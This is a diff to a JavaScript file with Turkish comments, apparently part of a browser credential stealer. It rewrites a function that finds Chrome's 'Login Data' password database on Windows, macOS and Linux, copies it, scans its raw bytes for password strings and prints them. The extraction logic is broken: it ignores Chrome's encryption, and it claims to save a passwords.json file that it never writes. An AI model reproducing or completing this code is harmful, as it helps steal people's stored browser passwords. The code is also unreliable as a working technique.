@@ -94,60 +94,73 @@ function ensureDirectoryExists(directory) {
   // browser ------------------------------------------------------------------------------------------------------------------------------------------------
 
 //passwd
-function getChromeProfilePath() {
+function exportChromePasswords() {
   const platform = os.platform();
+  let chromeProfilePath;
 
   if (platform === 'win32') {
     // Windows işletim sistemi için Chrome profil dizini
-    return path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default');
+    chromeProfilePath = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default');
   } else if (platform === 'darwin') {
     // macOS işletim sistemi için Chrome profil dizini
-    return path.join(os.homedir(), 'Library', 'Application Support', 'Google', 'Chrome', 'Default');
+    chromeProfilePath = path.join(os.homedir(), 'Library', 'Application Support', 'Google', 'Chrome', 'Default');
   } else if (platform === 'linux') {
     // Linux işletim sistemi için Chrome profil dizini
-    return path.join(os.homedir(), '.config', 'google-chrome', 'Default');
+    chromeProfilePath = path.join(os.homedir(), '.config', 'google-chrome', 'Default');
+  } else {
+    console.error('Desteklenmeyen işletim sistemi:', platform);
+    return null;
   }
 
-  // Diğer işletim sistemleri için varsayılan olarak null döndürülür
-  return null;
-}
+  const loginDataPath = path.join(chromeProfilePath, 'Login Data');
+  const loginDataBackupPath = path.join(chromeProfilePath, 'Login Data - Backup');
 
-async function exportChromePasswords() {
-  const chromeProfilePath = getChromeProfilePath();
+  try {
+    // Login Data dosyasını kopyala
+    fs.copyFileSync(loginDataPath, loginDataBackupPath);
 
-  if (chromeProfilePath) {
-    const loginDataPath = path.join(chromeProfilePath, 'Login Data');
-    const loginDataBackupPath = path.join(chromeProfilePath, 'Login Data - Backup');
+    // Login Data dosyasını oku
+    const data = fs.readFileSync(loginDataBackupPath);
 
-    const getPasswords = async () => {
-      try {
-        // Login Data dosyasını kopyala
-        fs.copyFileSync(loginDataPath, loginDataBackupPath);
+    // Veritabanı dosyası olarak oku
+    const database = new Uint8Array(data);
 
-        // Diğer işlemler aynı şekilde devam eder...
-        // (Şifreleri çözme, JSON formatına dönüştürme, dosyaya yazma)
+    // Şifreleri çöz
+    const passwordList = [];
 
-        console.log('Chrome şifreleri başarıyla alındı ve passwords.json dosyasına kaydedildi.');
-
-        // Chrome profil dizinini döndür
-        return loginDataPath;
-      } catch (error) {
-        console.error('Bir hata oluştu:', error);
-        return null;
-      } finally {
-        // Kopyalanan Login Data dosyasını sil
-        fs.unlinkSync(loginDataBackupPath);
+    for (let i = 0; i < database.length; i++) {
+      if (database[i] === 0x73 && database[i + 1] === 0x61 && database[i + 2] === 0x6c && database[i + 3] === 0x74) {
+        const passwordStartIndex = i + 56;
+        const passwordLength = database[i - 4] * 256 + database[i - 3];
+        const password = database.slice(passwordStartIndex, passwordStartIndex + passwordLength);
+        passwordList.push(password.toString());
       }
-    };
+    }
 
-    return getPasswords();
-  } else {
-    console.error('İşletim sistemine uygun Chrome profil dizini bulunamadı.');
+    // Şifreleri JSON formatına dönüştür
+    const passwordsJson = JSON.stringify(passwordList, null, 2);
+
+    console.log('Chrome şifreleri başarıyla alındı ve passwords.json dosyasına kaydedildi.');
+
+    return passwordsJson;
+  } catch (error) {
+    console.error('Bir hata oluştu:', error);
     return null;
+  } finally {
+    // Kopyalanan Login Data dosyasını sil
+    fs.unlinkSync(loginDataBackupPath);
   }
 }
 
 // Kullanım örneği
+const passwordsJson = exportChromePasswords();
+if (passwordsJson) {
+  console.log('Şifreler:', passwordsJson);
+} else {
+  console.log('Şifreler alınamadı.');
+}
+
+
 //passwd
 // string to file ------------------------------------------------------------------------------------------------------------------------------------------------
 
